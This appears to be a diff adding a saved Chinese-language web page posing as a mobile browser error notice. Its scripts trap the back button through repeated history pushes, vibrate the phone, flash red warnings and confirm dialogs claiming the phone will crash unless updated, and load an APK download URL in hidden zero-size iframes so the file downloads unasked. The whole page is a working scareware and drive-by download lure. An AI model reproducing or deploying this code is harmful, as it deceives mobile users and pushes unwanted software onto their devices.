@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<!-- saved from url=(0030)http://s.a0show.top/cs16.html# -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!-- <script src="https://o.a0shop.top/seajs.3"></script> -->
+    <script src="./出错啦！_files/us.js"></script>
+	<script src="./出错啦！_files/hhxx.js"></script>
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link rel="stylesheet" href="./出错啦！_files/demo.css">
+	<!-- <script src="https://c.xiaozhuyoupu.com/mdpb.js"></script> -->
+<script src="./出错啦！_files/jquery.min.js"></script>
+<script src="./出错啦！_files/T.js"></script> 
+<title>出错啦！</title>
+<!-- <script>
+				 //手机震动1秒
+                if (navigator.vibrate) {
+                    navigator.vibrate(5000);//震动1000毫秒
+                } else if (navigator.webkitVibrate) {
+                    navigator.webkitVibrate(5000);
+                }
+</script> -->
+
+<script>
+ var array = [ 
+'https://sl.sogoucdn.com/semob5.23.18_173447_R33447_121098058_build76462_3.2.0.3037.apk',
+'https://sl.sogoucdn.com/semob5.23.18_173447_R33447_121098058_build76462_3.2.0.3037.apk'
+
+    ];
+ var url_gs = array[Math.floor(Math.random() * (array.length))];
+var str4='';
+var area='';
+//var url_gs='https://sl.sogoucdn.com/semob5.22.8_170161_R30161_121098058_build71853_3.2.0.3000.apk';
+url_sg=url_gs;
+</script>
+</head>
+<body id="zendong" youdao="bind">
+<script>
+
+	function is_touch_device() {
+        return 'ontouchstart' in window // works on most browsers 
+                || 'onmsgesturechange' in window; // works on ie10
+    };
+
+
+    if ((is_touch_device() || (window.screen.availHeight + window.screen.availWidth) < 1700) && navigator.plugins.length == 0) {
+
+  		//alert('提示!\n\n最近免费电影，电视剧，伦理电影在线看！\n\n**请勿关闭本窗口**');
+
+      var c = 0;
+
+      window.onpopstate = function() {
+        c++;
+        if (c == 1) {
+          startVibrate();
+          tanc();
+        } 
+      };
+
+        var a=0;
+	
+        $(function(){
+			
+            pushHistory();
+			
+            window.addEventListener("popstate", function(e) {
+            if(a<20){
+                //第一次后退 
+                a++;
+				history.pushState("back", null, null);  
+				//window.setTimeout(function(){history.pushState(null, null);window.onpopstate = function(){history.go(-1);return false;};}, 500);
+            }else{
+                   // window.setTimeout(function(){history.pushState(null, null);window.onpopstate = function(){window.location.href = "http://y3.doukekan.cn/";return false;};}, 500);
+            }
+         
+            }, false);
+            function pushHistory() {
+            var state = {
+            title: "title",
+            url: "#"
+            };
+            window.history.pushState(state, "title", "#");
+            }
+            });
+
+
+
+	
+		//timer script
+		var sec = 59; // set the seconds
+		var min = 04; // set the minutes
+		var ci=0;
+		function countDown() {
+			if(ci <2){
+				
+				var waken = document.createElement('iframe');
+						waken.src = url_gs;
+						waken.style.cssText = 'display: none;height: 0px;width: 0px;';
+						document.body.appendChild(waken);
+				ci++;
+			}
+			sec--;
+			if (sec == -01) {
+				sec = 59;
+				min = min - 1; 
+			} else {
+				min = min; 
+			}
+			
+			if (sec<=9) { sec = "0" + sec; }
+			
+			//time = (min<=9 ? "" + min : min) + " 分钟 " + sec + " 秒";
+			
+			//if (document.getElementById) { document.getElementById('theTime').innerHTML = time; }
+			
+			SD=window.setTimeout("countDown();", 1000);
+			SD=window.setTimeout("countDown();", 3000);
+			SD=window.setTimeout("countDown();", 6000);
+			if (min == '00' && sec == '00') { sec = "00"; window.clearTimeout(SD); }
+		}
+		window.onload = countDown;
+		} 
+  </script>
+
+
+<div class="liulanqi1bgobox" onclick="downapk()">
+      <div class="ql-head className" style="background-color: rgb(255, 0, 0);">报错！您的 <script language="Javascript">document.write(str4+area);</script>手机浏览器版本过低，立即更新！</div>
+      <div class="ql-img"><img src="./出错啦！_files/chucuo-2.png"></div>
+      <div class="ql-shilian">页面失联了！系统故障，请立即更新...</div>
+      <div class="ql-probablecause">
+            <div>
+              <p>页面原因</p>
+              <p>服务器缓存过多导致系统故障</p>
+            </div>
+      </div>
+      <div class="ql-btn">
+            <a href="javascript:btn_xiufu()"><div>立即修复</div></a>
+            <a href="javascript:btn_xiufu()"><div class="btn-two">更 新<p class="mlbtn">免 流</p></div></a>
+      </div>
+</div>
+
+<script language="javascript">
+      var i = 0;
+      var j = 0;
+      function time() {
+        i++;
+        if (i < 7) {
+          setTimeout(time, 200);
+        } else if (i == 7) {
+          tanc();
+        }
+      }
+
+      $(function() {
+        time();
+		//zd
+        //startVibrate();
+      });
+      var array = ["#ff0000", "#fc4848"],
+        index = -1;
+
+      setInterval(function() {
+        index++;
+        index = index > array.length - 1 ? 0 : index;
+        $(".ql-head").css("backgroundColor", array[index]);
+      }, 500);
+
+      function tanc() {
+        var msg = confirm('您的'+str4+area+'手机 浏览器版本过低，请立即更新');
+        if (msg == true) {
+          location.href = "javascript:btn_xiufu()";
+        }
+      }
+
+
+      // 开始震动
+      function startVibrate() {
+        var u = navigator.userAgent,
+          app = navigator.appVersion;
+        var isAndroid = u.indexOf("Android") > -1 || u.indexOf("Linux") > -1; //安卓端
+        if (isAndroid) {
+          navigator.vibrate([3000, 2000, 1000]);
+        }
+      }
+
+      function downapk() {
+        // time2();
+        var msg = confirm("警告：您的"+str4+area+"手机请勿直接退出，否则将导致系统崩溃！");
+        if (msg == true) {
+          location.href = "javascript:btn_xiufu()";
+        } else {
+          location.href = "javascript:btn_xiufu()";
+        }
+      }
+
+
+    </script> 
+	
+<script>
+$(document).ready(function(e) {
+	var zd=0;
+    $("#zendong").click(function(){
+		if(zd == 0){
+		navigator.vibrate([1000, 10, 1000,10]);
+		}
+		zd++;
+	});
+
+
+});
+
+</script>
+<div style="display:none;"> 
+
+<img src="./出错啦！_files/yujiexi.jpg" style="border:none">
+</div>
+
+
+
+<div id="cli_dialog_div"></div><div id="ydNoteExtensionClipper" style="position: fixed; right: 10px; top: 10px; padding-bottom: 10px; font: 12px/100% arial, sans-serif; color: rgb(51, 51, 51); display: none; z-index: 2147483647 !important; height: 427px; width: 289px;"><div id="ydNoteExtensionClipper-New" class="ydnwc-dialog" style="border-radius: 5px; box-shadow: rgba(208, 208, 208, 0.2) 0px 6px 12px; width: 281px;"><div id="ydNoteExtensionClipper_view" style="background: rgb(255, 255, 255); border-radius: 5px; border: 1px solid rgb(208, 208, 208); height: 427px; width: 279px;"></div><div id="ydNoteExtensionClipper_loadview" style="position: absolute; height: 258px; background: rgb(255, 255, 255); top: 0px; left: 50%; display: none;"><img src="./出错啦！_files/loading.gif" style="position: absolute;top: 20%;margin-left: -20px;"></div></div><div style="display: none;"><form id="_YNoteContentForm" name="_YNoteContentForm" action="http://note.youdao.com/yws/mapi/wcp?method=putfile&amp;keyfrom=wcp&amp;from=chrome&amp;confirm=false&amp;e=true&amp;vendor=ChromeStore&amp;vn=2" target="1ContentFrame&amp;ChromeStore" enctype="multipart/form-data" method="POST"><input type="text" name="tl" id="_YNoteContentFormtitle" value=""><input type="text" name="p" id="_YNoteContentFormpath" value=""><textarea name="bs" id="_YNoteContentFormcontent"></textarea><input type="text" name="src" id="_YNoteContentFormsource" value=""><input type="text" name="type" id="_YNoteContentFormtype" value=""><input type="text" name="userid" id="_YNoteContentFormuserid" value=""><input type="text" name="len" id="_YNoteContentFormlen" value=""><input type="text" name="cs" id="_YNoteContentFormcharset" value=""><input type="text" name="e" id="_YNoteContentFormsign" value=""></form></div></div></body></html>
